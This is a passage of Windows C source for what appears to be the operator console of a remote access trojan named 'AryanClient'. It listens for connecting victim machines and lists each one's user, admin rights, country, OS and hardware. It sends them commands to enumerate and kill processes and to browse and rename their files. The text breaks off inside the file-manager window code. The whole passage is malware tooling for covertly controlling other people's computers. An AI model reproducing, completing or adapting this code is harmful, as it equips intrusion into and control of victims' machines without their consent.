#include <windows.h>
#include <stdio.h>
#include <commctrl.h>
#include <time.h>
#include "resource.h"
#include "AryanClient.h"
//////////////////////////////////////////////////////////////////////////////// 
//Async Sockets
#define	RATMSG_SOCKET			WM_USER+1


unsigned short	ServerPort=1000;
SOCKET			hSock;
SOCKET			Client[1024];
SOCKADDR_IN		ServAdr;
WORD			Event;
int				AdrLen=sizeof(sockaddr);
/////////////////////////////////////////////////////////////////////////////////
PACKETHEAD	    Head;
DWORD		    HeadSize=sizeof(PACKETHEAD);
int				S = 0;
bool WaitForData = 0;
DWORD           thread;
////////////////////////////////////////////////////////////////////////////////
//window thread Handles

//////////////////////////////////////////////////////////////////////////////// 
//HWND Handles
HWND hStatus;
HWND hDlg;
HWND HwND;

HWND TASKS[1024];
HWND SHwnd[1024];
HWND FileHwnd[1024];
//////////////////////////////////////////////////////////////////////////////// 
HINSTANCE ShInst;
HINSTANCE TaInst;
HINSTANCE FileInst;
HINSTANCE GInstance;
//////////////////////////////////////////////////////////////////////////////// 
int port = 0;
int x = 0;
int y = 0;
int z = 0;
int N = 0;
int P = 0;
int Q = 0;
////////////////////////////////////////////////////////////////////////////////
//Logs Buffers
char Operation[100] = "";
char Result[100] = "";
char * Time;
char Error [10] = "";
////////////////////////////////////////////////////////////////////////////////
char ID [100] = "";
////////////////////////////////////////////////////////////////////////////////
//Task 
int STATE;
////////////////////////////////////////////////////////////////////////////////
//file window handles/Buffers
char LastText [100];
TV_ITEM tvi;
HTREEITEM Selected;
TV_INSERTSTRUCT tvinsert;   // struct to config out tree control
HTREEITEM Parent;           // Tree item handle
HTREEITEM Before;           // .......
HTREEITEM Root;             // .......
HTREEITEM LastSelected;
HIMAGELIST hImageList;      // Image list array hadle
HBITMAP hBitMap;            // bitmap handler
bool flagSelected=false;
char FinalDir [512] = "";
// for drag and drop
HWND hTree;
//BookMark Tree
TV_ITEM TVI;
HTREEITEM SELECTED;
TV_INSERTSTRUCT TVINSERT;   // struct to config out tree control
HTREEITEM BookRoot;
HTREEITEM BookMark;
HIMAGELIST BookImageList;
HBITMAP hBookMap;

////////////////////////////////////////////////////////////////////////////////
//File
char Copy [100] = "";
char FileName [100] = "";
int J = 2;
int V = 0;
DWORD WINAPI SendFile(LPVOID lpParam);
////////////////////////////////////////////////////////////////////////////////
//	Time
void GetTime()
{
  time_t rawtime;
  struct tm * timeinfo;

  time ( &rawtime );
  timeinfo = localtime ( &rawtime );
  
  Time = asctime (timeinfo);

}
////////////////////////////////////////////////////////////////////////////////
//SetListViews
void SetProc(char * Process, char * PID, char * PPID, char * Threads, char * Pri, int ID)
{
    LV_ITEM	 item;
	item.mask=TVIF_TEXT;
	item.iItem=P;

	item.iSubItem=0;
	item.pszText=Process;
	item.iItem=ListView_InsertItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=1;
	item.pszText=PID;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=2;
	item.pszText=PPID;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=3;
	item.pszText=Threads;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);

	item.iSubItem=4;
	item.pszText=Pri;
	ListView_SetItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);
P++;
}
void SetTask(char * Task, int ID)
{
    LV_ITEM	 item;
	item.mask=TVIF_TEXT;
	item.iItem=0;

	item.iSubItem=0;
	item.pszText=Task;
	item.iItem=ListView_InsertItem(GetDlgItem(TASKS[ID],IDC_TASKLIST),&item);
}
////////////////////////////////////////////////////////////////////////////////
void SetLog(char *op,char *res)
{
	GetTime();
	LV_ITEM	item;
	item.mask=TVIF_TEXT;
	item.iItem=0;
	item.iSubItem=0;
	item.pszText=Time;
	item.iItem=ListView_InsertItem(GetDlgItem(HwND,IDC_LOGS),&item);
	item.iSubItem=1;
	item.pszText=op;
	ListView_SetItem(GetDlgItem(HwND,IDC_LOGS),&item);
	item.iSubItem=2;
	item.pszText=res;
	ListView_SetItem(GetDlgItem(HwND,IDC_LOGS),&item);
	item.iSubItem=3;
	item.pszText=Error;
	ListView_SetItem(GetDlgItem(HwND,IDC_LOGS),&item);
}
void SetServer(char * Resolution, char * ADMIN, char * CPU, char * RAM, char * ServerVersion, char * User, char * Country, char * OS, char * ID)
{
	LV_ITEM	item;
	item.mask=TVIF_TEXT;
	item.iItem=	Head.ID;

	item.iSubItem=0;
	item.pszText=ID;
	item.iItem=ListView_InsertItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=1;
	item.pszText=User;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
	
	item.iSubItem=2;
	item.pszText=ADMIN;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=3;
	item.pszText=Country;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
	
	item.iSubItem=4;
	item.pszText=OS;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=5;
	item.pszText=RAM;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=6;
	item.pszText=CPU;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);
	
	item.iSubItem=7;
	item.pszText=Resolution;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	item.iSubItem=8;
	item.pszText=ServerVersion;
	ListView_SetItem(GetDlgItem(HwND,IDC_SERVERLIST),&item);

	strcpy(Operation,  "Connection");
	sprintf(Result,"%s Connected on port: %d", User, ServerPort);
	strcpy(Error, "PASS");
	SetLog(Operation,Result);
}
////////////////////////////////////////////////////////////////////////////////
//Logs

/////////////////////////////////////////////////////////////////////////////////////////////////
//Initilise WSA
void InitWSA()
{
	WORD	wVersionRequested;
	WSADATA wsaData;
	int		err;
	wVersionRequested = MAKEWORD( 2, 0 );
    err = WSAStartup( wVersionRequested, &wsaData );
    if ( err != 0 )
		PostQuitMessage(1);

    if ( LOBYTE( wsaData.wVersion ) != 2 ||
		 HIBYTE( wsaData.wVersion ) != 0 )
	{
	    WSACleanup();
		PostQuitMessage(0);
	}
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Initilise Socket for async uses.
bool InitSocket(HWND hwnd)
{
	hSock = socket(AF_INET,SOCK_STREAM,0);
	WSAAsyncSelect(hSock,hwnd,RATMSG_SOCKET,FD_ACCEPT|FD_CLOSE|FD_READ);
	ServAdr.sin_family=AF_INET;
	ServAdr.sin_addr.s_addr=htonl(INADDR_ANY);
	ServAdr.sin_port=htons(ServerPort);
	bind(hSock,(LPSOCKADDR)&ServAdr,sizeof(struct sockaddr));
	listen(hSock, 1);
	return TRUE;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//close each socket that has connected
void CloseSocket(HWND hwnd)
{
	closesocket(hSock);
/*  for(int	M; S != M, M++;);
	{
	send(Client[M], "Reset", sizeof("Reset"), 0);
	}*/
	for(int A = 0; S != A, A++;);
	{
	closesocket(Client[A]);
	}
	WSACleanup();
	SendMessage(hwnd, SB_SETTEXT, 0, (LPARAM)"Connection status: Not listening");
}
BOOL ResetProcs(HWND hwnd, int H)
{
if(ListView_DeleteAllItems(GetDlgItem(hwnd,H)))
{
return TRUE;
}
else
{
MessageBox(NULL, "ERROR RESETTING LIST VIEW!", "ERROR", MB_OK | MB_ICONINFORMATION);
return FALSE;
}
return TRUE;
}
 
/////////////////////////////////////////////////////////////////////////////////////
//Shell Window Call back

/////////////////////////////////////////////////////////////////////////////////////
//Set Files.
BOOL ResetFiles(HWND hwnd)
{
if(ListView_DeleteAllItems(GetDlgItem(hwnd,IDC_FILELIST)))
{
return TRUE;
}
else
{
MessageBox(NULL, "ERROR RESETTING FILE VIEW!", "ERROR", MB_OK | MB_ICONINFORMATION);
return FALSE;
}
return TRUE;
}
void SetDrive(char * Drive, int ID)
{
			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;
			switch(Head.ID2)
			{
			case 1:	
			tvinsert.item.iImage=5;
				break;
			case 2:
			tvinsert.item.iImage=1;
				break;
			case 3:
			tvinsert.item.iImage=2;
				break;
			case 4:
			tvinsert.item.iImage=3;
				break;
			case 5:
			tvinsert.item.iImage=4;
				break;
			}

			tvinsert.item.pszText=Drive;
			Parent=(HTREEITEM)SendDlgItemMessage(FileHwnd[ID],IDC_TREE1,TVM_INSERTITEM,0,(LPARAM)&tvinsert);

			Root=Parent;
			tvinsert.item.iImage=1;

}

void SetFile(char * FileName, char * FileSize, int ID, int ID2, int Type) //char * CreationTime, char * LastAccessTime, char * LastWriteTime ,
{

    LV_ITEM	item;
	item.iImage = 0;
	switch(ID2)
	{
	case 1:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;

	item.iSubItem=0;
	item.pszText=FileName;
	item.iImage = Type;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[ID],IDC_FILELIST),&item);

	item.iSubItem=1;
	item.pszText=FileSize;

	ListView_SetItem(GetDlgItem(FileHwnd[ID],IDC_FILELIST),&item);

	break;

	case 2:
	if(!strcmp(FileName, ".") || !strcmp(FileName, ".."))
	{
	break;
	}

	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	
	item.iSubItem=0;
	item.pszText=FileName;
	item.iImage = Type;
	item.iItem=ListView_InsertItem(GetDlgItem(FileHwnd[ID],IDC_FOLDERS),&item);

	break;
	}
}

/////////////////////////////////////////////////////////////////////////////////////
//Task callBack
LRESULT CALLBACK TaskProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	int FG = 0;
     
	int i= 0;
	int j=0;
	LV_COLUMN	col;
	LV_ITEM		item;
	//THwnd = hwnd;
	HWND Status = 0;
	HWND hEdit = 0;

    HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   

	RECT rc;    // client area             
    POINT  pt;   // location of mouse click 
	
	TCITEM tie;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		InitCommonControls(); 
		/////////////////////////////////////////////////////////////
		//Task List
    tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Process";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB1), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Applications";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB1), 1, &tie);
     
        ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_TASKLIST),LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);

     	col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=200;
		col.pszText="Process";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),0,&col);
		col.cx=100;
		col.pszText="PID";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),1,&col);
		col.cx=100;
		col.pszText="Parent PID";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),2,&col);
		col.cx=100;
		col.pszText="Threads";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),3,&col);
		col.cx=100;
		col.pszText="Priority";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_TASKLIST),4,&col);


		 Status = CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hwnd, (HMENU)IDC_TASK_STATUS , GetModuleHandle(NULL), NULL);
		 SendMessage(Status, SB_SETTEXT, 0, (LPARAM)"");
	break;
    case WM_NOTIFY:
	
	switch(wParam)

	{
	case IDC_TASKLIST:

			if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hwnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y -= 30;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
			
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU1));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
 
            // Draw and track the shortcut menu.  
 
            TrackPopupMenu(hmenuTrackPopup, TPM_LEFTALIGN | TPM_LEFTBUTTON, pt.x, pt.y, 0, hwnd, NULL); 
			break;
			}
			break;
	case IDC_TAB1:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                { 
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(hwnd, IDC_TAB1)); 
                    if(iPage != 0)
					{
					ResetProcs(hwnd, IDC_TASKLIST);
					STATE = 1;
						col.mask=LVCF_TEXT|LVCF_WIDTH;
		                col.cx=600;
		                col.pszText="Window";
	                  	ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),0,&col);

						col.mask=LVCF_TEXT|LVCF_WIDTH;
		                col.cx=0;
		                col.pszText="";
	                  	ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),1,&col);

					col.cx=0;
					col.pszText=" ";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),2,&col);
					col.cx=0;
					col.pszText=" ";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),3,&col);
					col.cx=0;
					col.pszText=" ";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),4,&col);

					P = 0;
			                 ResetProcs(hwnd, IDC_TASKLIST);
							 GetWindowText(hwnd, WindowOut, 10);
							 WindowOutY[0] += WindowOut[0];
							 Head.ID = atoi(WindowOutY);
							 Head.PacketType=PACKET_TASK_MANAGER_TASKS;
							 send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
					}
					else
					{
					STATE = 0;
					ResetProcs(hwnd, IDC_TASKLIST);
					col.mask=LVCF_TEXT|LVCF_WIDTH;
					col.cx=200;
					col.pszText="Process";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),0,&col);
					col.cx=100;
					col.pszText="PID";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),1,&col);
					col.cx=100;
					col.pszText="Parent PID";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),2,&col);
					col.cx=100;
					col.pszText="Threads";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),3,&col);
					col.cx=100;
					col.pszText="Priority";
					ListView_SetColumn(GetDlgItem(hwnd,IDC_TASKLIST),4,&col);

					 P = 0;
			                 ResetProcs(hwnd, IDC_TASKLIST);
							 GetWindowText(hwnd, WindowOut, 10);
							 WindowOutY[0] += WindowOut[0];
							 Head.ID = atoi(WindowOutY);
							 Head.PacketType=PACKET_TASK_MANAGER;
							 send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
					}
				
                    
                }
				break;
            }
		break;
	}
	break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
	
		case IDC_REFRESH_TASK:
			if(STATE == 0)
			{
			                 P = 0;
			                 ResetProcs(hwnd, IDC_TASKLIST);
							 GetWindowText(hwnd, WindowOut, 10);
							 WindowOutY[0] += WindowOut[0];
							 Head.ID = atoi(WindowOutY);
							 Head.PacketType=PACKET_TASK_MANAGER;
							 send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
			}
			else
			{
						     P = 0;
			                 ResetProcs(hwnd, IDC_TASKLIST);
							 GetWindowText(hwnd, WindowOut, 10);
							 WindowOutY[0] += WindowOut[0];
							 Head.ID = atoi(WindowOutY);
							 Head.PacketType=PACKET_TASK_MANAGER_TASKS;
							 send(Client[Head.ID],(char*)&Head,HeadSize,0);
							 break;
			}
							 break;
		case IDC_TASK_KILL:
			if(MessageBox(NULL, "Are you sure you want to kill the selected task?", "Proc manager", MB_YESNO | MB_ICONQUESTION) == IDYES)
			{
			    item.iItem=ListView_GetNextItem(GetDlgItem(hwnd,IDC_TASKLIST),-1,LVNI_SELECTED);
				item.mask=LVIF_TEXT;
				item.iSubItem=0;
				item.pszText=Head.Data;
				item.cchTextMax=255;
				ListView_GetItem(GetDlgItem(hwnd,IDC_TASKLIST),&item);
				GetWindowText(hwnd, WindowOut, 10);
				WindowOutY[0] += WindowOut[0];
				Head.ID = atoi(WindowOutY);
				Head.PacketType = PACKET_TASK_MANAGER_KILL;
				send(Client[Head.ID],(char*)&Head,HeadSize,0);
				ResetProcs(hwnd, IDC_TASKLIST);
				//////////////////////////////////////////// 
			}
			else
			{
			break;
			}
			break;
		case IDCANCEL:
					GetWindowText(hwnd, WindowOut, 10);
			        WindowOutY[0] += WindowOut[0];
			        Head.ID = atoi(WindowOutY);
					TASKS[Head.ID] = NULL;

					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
/////////////////////////////////////////////////////////////////////////////////////
//File Window Call back
LRESULT CALLBACK RenameProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select = 0;
    char  WindowOut [10] = "";
	char WindowOutY [10] = "";
	HWND file = 0;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		//ShowWindow(hwnd,SW_SHOW);
		if(V == 1)
		{
	    SetWindowText(GetDlgItem(hwnd, IDC_NAME), Copy);
		}
		else
		{
		strcpy(Copy, FinalDir);
		strcat(Copy, FileName);
		SetWindowText(GetDlgItem(hwnd, IDC_NAME), Copy);
		}
	break;

	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_SETNAME:
		    GetWindowText(GetDlgItem(hwnd, IDC_NAME), Head.Data, 1020);
			GetWindowText(hwnd, WindowOut, 10);
			WindowOutY[0] += WindowOut[0];
			Head.ID = atoi(WindowOutY);
			Head.PacketType = PACKET_FILE_MANAGER_FILE_RENAME;
			strcpy(Head.Buf, Copy);
			send(Client[Head.ID],(char *) &Head, sizeof(Head), 0);
	
			ResetProcs(FileHwnd[Head.ID] , IDC_FOLDERS);
			ResetProcs(FileHwnd[Head.ID], IDC_FILELIST);
/////////////////////////////////////////////////////////////////////////////////
			strcpy(Head.Data, FinalDir);
			Head.PacketType = PACKET_FILE_MANAGER_FILE_FOLDER;
			send(Client[Head.ID],(char*)&Head, HeadSize, 0);
			EndDialog(hwnd,Select);
			break;
		case IDCANCEL:
			        EndDialog(hwnd,Select);
					break;
		}
		return TRUE;
	}
	return 0;
}

HWND ReName[1024];
HINSTANCE ReInst;

DWORD WINAPI NameWindow(LPVOID lpParam)
{
    int LID = Head.ID;
	char WindowText [20] = "";
	POINT pt;
    GetCursorPos(&pt);
	pt.y -= 20;
	pt.x -= 20;
    ReName[LID]=CreateDialog(ReInst,(LPCTSTR)IDD_RENAME,NULL,(DLGPROC)RenameProc);
	ShowWindow(ReName[LID],SW_SHOW);
	SetWindowPos(ReName[LID], HWND_TOP, pt.x, pt.y, 0, 0, SWP_NOSIZE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"%d", LID);
    strcat(WindowText, " Rename");
	SetWindowText(ReName[LID], WindowText);

	MSG msg;
	while(GetMessage(&msg,ReName[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}

LRESULT CALLBACK FileProc(HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam)
{
    char Text[255];
	char WindowOutY [10] = "";
	char WindowOut  [10] = "";
     
	HWND Status = 0;
    
     MSG msg;

    NMITEMACTIVATE LPNMITEM;
	LV_COLUMN	col;
	LV_ITEM		item;
	
	HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   

	RECT rc;    // client area             
    POINT  pt;   // location of mouse click  

	HICON hIcon;

	TCITEM tie; 

    int i = 0;
	int j = 0;
    int Select = 0;

	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		InitCommonControls();	    // make our tree control to work
		////////////////////////////////////////////////////////////////////////////////////////////////////////
		 //Drive view
			hImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
			ImageList_SetBkColor(hImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]
			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_BOOKMARKRED), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FLOPPY), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);
			
			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CD), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);								      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);
			
			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_NETWORK), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);								      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);	// no need it after loading the bitmap

		    hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_BOOKMARK), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);								      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_STATIC), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_BOOKMARKBLUE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);						      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_BOOKMARKPURPLE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FOLDER), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);
			
		    hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FILE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_EXE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_COMPRESSED), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_MEDIA), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_PICTURE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_TEXT), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_VIDEO), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			DeleteObject(hIcon);
			ImageList_SetBkColor(hImageList,CLR_NONE);
			//hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FOLDER), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			//ImageList_AddIcon(hImageList, hIcon);
     

		
 	    col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=200;
		col.fmt = LVCFMT_IMAGE;
        ListView_SetExtendedListViewStyle(GetDlgItem(hWnd,IDC_FILELIST),LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES);
		col.pszText="File name";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),0,&col);
		col.cx=152;
		col.fmt = LVCFMT_IMAGE;
		col.pszText="File Size";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),1,&col);
		col.cx=152;
		col.fmt = LVCFMT_IMAGE;
		col.pszText="CreationTime";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),2,&col);
		col.cx=152;
		col.fmt = LVCFMT_IMAGE;
		col.pszText="LastAccessTime";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),3,&col);
		col.cx=152;
		col.fmt = LVCFMT_IMAGE;
		col.pszText="LastWriteTime";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FILELIST),4,&col);
///////////////////////////////////////////////////////////////////////////////////
        ListView_SetExtendedListViewStyle(GetDlgItem(hWnd,IDC_FOLDERS),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=200;
		col.fmt = LVCFMT_IMAGE;
		col.pszText="Folder Name";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_FOLDERS),0,&col);
///////////////////////////////////////////////////////////////////////////////////
		ListView_SetExtendedListViewStyle(GetDlgItem(hWnd,IDC_DOWNLOADS),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=300;
		col.pszText="File";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 0,&col);
		
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=200;
		col.pszText="Upload/Download";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 1,&col);

		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=200;
		col.pszText="Status";
		ListView_InsertColumn(GetDlgItem(hWnd,IDC_DOWNLOADS), 2,&col);
////////////////////////////////////////////////////////////////////////////////////////////////////////
		//Satus Bar
		 CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hWnd, (HMENU)IDC_TASK_STATUS , GetModuleHandle(NULL), NULL);
		 SendMessage(GetDlgItem(hWnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)"");


			

			tvinsert.item.iSelectedImage = 5;
		    SendDlgItemMessage(hWnd,IDC_TREE1,TVM_SETIMAGELIST,0,(LPARAM)hImageList); // put it onto the tree control
			SendDlgItemMessage(hWnd,IDC_BOOKMARKS,TVM_SETIMAGELIST,0,(LPARAM)hImageList);
            ListView_SetImageList(GetDlgItem(hWnd, IDC_FOLDERS),hImageList, LVSIL_SMALL);
			ListView_SetImageList(GetDlgItem(hWnd, IDC_FILELIST),hImageList, LVSIL_SMALL);


			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE;
			tvinsert.item.pszText="BookMarks";
			tvinsert.item.iImage=6;
			Parent=(HTREEITEM)SendDlgItemMessage(hWnd,IDC_BOOKMARKS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
			Root=Parent;
	break;
	
		case WM_LBUTTONDOWN: 
		{
			ReleaseCapture(); 
			SendMessage(hWnd,WM_NCLBUTTONDOWN,HTCAPTION,0); 
		}
		break;

		case WM_NOTIFY:
		{
switch(wParam)
{
		case IDC_FILELIST:
		{
            
			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{ 
				break;
			}

			if(((LPNMHDR)lParam)->code == NM_RCLICK)  // Right Click
			{
				GetClientRect(hWnd, (LPRECT) &rc); 
 
            // Get the client coordinates for the mouse click.  
			  GetCursorPos(&pt);
			  pt.y += 10;
			  pt.x += 10;
            // If the mouse click took place inside the client 
            // area, execute the application-defined function 
            // that displays the shortcut menu. 
 
        
				 hmenu = LoadMenu(GInstance, MAKEINTRESOURCE(IDR_MENU3));

				 if (hmenu == NULL) 
				 {
                  break;
				 }
 
			// Get the first shortcut menu in the menu template. This is the 
			// menu that TrackPopupMenu displays. 
 
			hmenuTrackPopup = GetSubMenu(hmenu, 0); 
 
              // TrackPopup uses screen coordinates, so convert the 
             // coordinates of the mouse click to screen coordinates. 
 
             //ClientToScreen(hWnd, (LPPOINT) &pt); 
 
            // Draw and track the shortcut menu.  
 
